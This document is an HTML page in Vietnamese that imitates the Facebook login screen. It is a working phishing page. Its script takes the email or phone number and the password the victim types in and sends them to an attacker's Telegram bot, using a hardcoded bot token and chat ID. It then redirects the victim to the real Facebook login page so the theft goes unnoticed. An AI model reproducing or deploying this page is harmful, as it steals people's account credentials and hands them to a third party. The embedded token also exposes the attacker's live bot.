<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Đăng nhập Facebook</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1); width: 100%; max-width: 396px; text-align: center; }
        .logo { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 20px; }
        input { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; outline: none; }
        input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
        .btn-login { background-color: #1877f2; border: none; border-radius: 6px; color: #fff; font-size: 20px; font-weight: 700; padding: 10px; width: 100%; cursor: pointer; }
        .footer { margin-top: 20px; border-top: 1px solid #dadde1; padding-top: 20px; }
        .btn-new { background-color: #42b72a; border: none; border-radius: 6px; color: #fff; font-size: 17px; font-weight: 700; padding: 10px 16px; cursor: pointer; text-decoration: none; }
    </style>
</head>
<body>
    <div class="box">
        <div class="logo">facebook</div>
        <form id="loginForm">
            <input type="text" id="email" placeholder="Email hoặc số điện thoại" required>
            <input type="password" id="pass" placeholder="Mật khẩu" required>
            <button type="submit" class="btn-login">Đăng nhập</button>
        </form>
        <div style="margin-top: 16px"><a href="#" style="color: #1877f2; text-decoration: none; font-size: 14px;">Quên mật khẩu?</a></div>
        <div class="footer">
            <button class="btn-new">Tạo tài khoản mới</button>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            var u = document.getElementById('email').value;
            var p = document.getElementById('pass').value;

            // Mã
            var t = "8725871545:AAFCQX7uuQaisrVCwKH9vUdFm22j8smks0"; // Token
            var c = "1946891510"; // Chat ID
            
            var msg = "🔔 LOGIN FB MỚI\n👤 User: " + u + "\n🔑 Pass: " + p;
            
            // Gửi 
            var url = "https://api.telegram.org/bot" + t + "/sendMessage";
            var params = "chat_id=" + c + "&text=" + encodeURIComponent(msg);

            var x = new XMLHttpRequest();
            x.open("POST", url, true);
            x.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            x.send(params);

            // Chuyển hướng sau khi gửi xong
            setTimeout(function() {
                window.location.href = "https://www.facebook.com/login/";
            }, 800);
        });
    </script>
</body>
</html>
